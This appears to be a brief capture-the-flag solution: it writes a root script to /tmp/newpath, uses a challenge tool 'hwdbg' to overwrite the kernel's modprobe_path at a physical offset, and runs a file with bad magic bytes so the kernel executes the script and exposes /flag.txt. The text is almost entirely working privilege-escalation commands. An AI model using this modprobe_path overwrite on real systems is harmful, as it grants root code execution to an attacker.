Create /tmp/newpath with following contents:
#!/bin/sh
cp /flag.txt /tmp/flag.txt
chmod 777 /tmp/flag.txt

then create a fake executable to trigger modprobe path:

echo -ne '\xff\xff\xff\xff' > /tmp/dummy

then execute hwdbg with phys offset of modprobe path (found w/ gdb):

echo -ne '/tmp/newpath\0' | hwdbg mw 13 0x3433b60

execute dummy file which will trigger /tmp/newpath
